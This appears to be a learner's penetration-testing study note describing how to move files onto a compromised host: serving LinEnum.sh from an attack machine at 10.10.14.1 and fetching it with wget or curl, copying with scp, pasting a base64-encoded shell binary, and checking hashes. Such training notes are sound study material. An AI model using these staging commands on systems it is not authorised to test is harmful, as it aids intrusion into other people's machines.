@@ -1,0 +1,82 @@
+Transferring Files
+
+
+
+
+
+
+*during any penetration testing exercise it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits or transfer data back to our attack host. while tools like Metasploit with a meterpreter shell allow us to use the #Upload command to upload the file we need to learn methods to transfer files with a standard reverse shell.
+
+
+
+
+
+
+Using command #wget
+
+*there are many methods to accomplish this. one method is running a python http server on our machine and then using the commands #wget or #cURL to download the file on the remote host.
+
+1. first we go into the directory that contains the file we need to transfer and run a python http server in it. so like how we did the commands #sudo_-u_user1 to gain access to user1 then went through its files and captured the flag. instead of just capturing the flag this time we will be downloading and transferring it using the python http server.
+
+2. so to setup a listening server/ python http server i will use the commands #cd_/tmp and then #python3_-m_http.server_8000 on my own machine. this sets the listener up on my own machine and now i can download the file on the remote host that i have code execution on/have access to already via ssh or through another vulnerability.
+
+3. now to transfer the file from my host computer to designated target i will use the commands #wget_http://10.10.14.1:8000/Linenum.sh. i used the ip address 10.10.14.1 and the port my python server is running on which is port 8000. if the remote server does not have the command #wget i can also use #cURL_http://10.10.14.1:8000/linenum.sh_-o_linenum.sh to download the file. all of this will be done on the machine we are attacking so thats why if that machine doesn't have the command #wget i would use the command #cURL because it would most likely have this command installed already. 
+
+4. Note that we have used the -o flag to specify the output file name. 
+
+
+
+
+
+
+
+
+
+Using SCP
+
+*another method to transfer files would be using the command #scp granted we have already obtained ssh user credentials on the remote host. 
+
+1. so instead of using the commands #wget or #cURL we can use the command #scp_linenum.sh_user@remotehost:/tmp/linenum.sh
+
+2. note that we specified the local file name after #scp and the remote directory will be saved to after the ":".
+
+
+
+
+
+
+
+
+
+
+
+Using Base64
+
+*in some cases we may not be able to transfer the file. for example the remote host may have firewall protections that prevent us from downloading a file from our machine. in this type of situation we can use a simple trick to #base64 encode the file into #base64 format and then we can paste the #base64 string on the remote server and decode it. for example if we wanted to transfer a binary file called shall we can #base64 encode it like such:
+
+1. to encode using the command #base64 we will do #base64_shell-w_0  and thats a zero at the end. 
+
+2. now we can copy this #base64 string, go to the remote host, and use the command #base64_-d to decode it and pipe the output into a file.
+
+3. it should look something like this: #user@remotehost$_echo_f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA..._<SNIP>_...lIuy9iaW4vc2gAU0iJ51JXSInmDwU_|_base64_-d_>_shell
+
+
+
+
+
+
+
+
+
+
+
+
+Validating File Transfers
+
+*to validate the format of a file we can run the #file command on it as such:
+
+1. i can use the command #file_shell and i should see we can run the file command on the shell file, it should say that it us an ELF binary meaning that we successfully transferred it. to ensure that we did not mess up the file during the encoding/decoding process we can check its md5 hash. on our machine we can run the command #md5sum on it to see.
+
+2. so to check if the file was messed up we will use the command #md5sum_shell on our host computer, then we can go to the remote server and run the same command. the end result should look something similar to this: #321de1d7e7c3735838890a72c9ae7d1d_shell
+
+3. as we can see both files have the same md5 hash meaning the file transferred correctly. there are various other methods for transferring files. 
